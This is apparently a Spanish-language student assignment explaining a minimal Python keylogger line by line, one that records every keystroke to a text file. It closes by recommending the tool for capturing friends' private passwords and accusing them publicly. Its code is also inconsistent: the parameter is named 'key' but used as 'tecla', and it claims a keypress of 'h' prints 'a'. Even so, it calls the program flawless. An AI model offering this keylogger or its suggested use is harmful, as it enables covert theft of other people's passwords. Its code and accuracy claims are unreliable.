# SI_T5_P1

# import keyboard:

Este comando es para importar la librería de keyboard

# def keylogger(key): 

A continuacion haremos una función llamada def keylogger y pondremos una variable llamada key.

# print(tecla.name)

Para que cuando se pulse una tecla va a poner su nombre, osea que si presionamos la "h" saldra "a" y pues si presionamos la tecla espacio saldra la palabra "space".

# with open('texto.txt', 'a') as file:

Abre (o crea si no existe) el archivo texto.txt en modo de adición ('a'), lo que permite agregar texto sin borrar el contenido previo.

# if tecla.name == 'space':

Verifica si la tecla presionada es la barra espaciadora.

# file.write(' ')

Si la tecla es un espacio escribe un espacio en el archivo en lugar de la palabra "space".

# else:
# file.write(key.name)

Si la tecla no es un espacio escribe el nombre de la tecla en el archivo.

# keyboard.on_press(keylogger)

Configura la función keylogger para ejecutarse cada vez que se presione una tecla.

# keyboard.wait()

Mantiene el programa en ejecución esperando eventos del teclado.

# Funciona?

Pues claro, ejecutas el keylogger.py y una vez lo inicias el archivo guarda las teclas que se pulsaron en el texto.txt, ademas lo puedes usar para saber las contraseñas privadas de tus amigos y acusarlos publicamente.

# Aspectos a mejorar

Ninguno, funciona a la perfeccion y es confiable 🤑
